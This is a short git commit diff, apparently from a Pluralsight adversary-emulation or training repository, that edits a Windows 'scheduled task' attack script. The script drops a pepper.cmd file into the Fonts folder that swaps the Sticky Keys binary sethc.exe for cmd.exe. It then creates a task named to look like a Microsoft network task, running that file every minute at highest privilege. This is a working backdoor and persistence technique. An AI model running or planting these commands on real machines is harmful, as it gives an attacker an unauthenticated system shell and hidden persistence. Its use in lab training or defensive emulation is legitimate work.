6cc368b1a14cbca103a6b74b3a91e28f5e38d84b
treyescairo-pluralsight <64978363+treyescairo-pluralsight@users.noreply.github.com>
2024-01-04 10:20:14 -0700

    Change endpoint attacks to use pwsh, update scheduled task ttp

--- endpoint_attacks/scheduled_tasks/ttp.ps1
+++ endpoint_attacks/scheduled_tasks/ttp.ps1
@@ -1,3 +1,3 @@
 echo "c:\\Windows\\System32\\sethc.exe c:\\Windows\\System32\\chtes.old && del c:\\Windows\\System32\\sethc.exe && copy c:\\Windows\\System32\\cmd.exe c:\\Windows\\System32\\sethc.exe" >> c:\\Windows\\Fonts\\pepper.cmd
 
-SCHTASKS /CREATE /SC MINUTE /TN MICROSOFT\\Windows\\WCM\\Nettask /TR c:\\Windows\\Fonts\\pepper.cmd /RL HIGHEST
+SCHTASKS /CREATE /SC MINUTE /TN MICROSOFT\Windows\WCM\Nettask /TR C:\Windows\Fonts\pepper.cmd /RL HIGHEST
